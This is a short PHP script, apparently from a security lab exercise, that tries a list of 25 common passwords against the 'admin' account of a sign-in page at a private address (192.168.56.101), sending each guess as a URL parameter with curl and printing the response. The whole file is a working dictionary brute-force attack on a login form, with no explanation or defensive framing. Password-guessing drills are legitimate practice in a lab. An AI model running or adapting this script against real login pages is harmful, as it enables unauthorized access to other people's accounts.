<?php

    $arr = array('123456', "password", "12345678", "qwerty", "abc123", "123456789", "111111", "1234567", "iloveyou", "adobe123", "123123", "Admin", "1234567890", 
    "letmein", "photoshop", "1234", "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000");

    $ch = curl_init();
    foreach ($arr as $value) {
        $url = "http://192.168.56.101/?page=signin&username=admin&password=" . $value . "&Login=Login#";
        curl_setopt($ch, CURLOPT_URL, $url);
        echo curl_exec($ch);
    }

?>
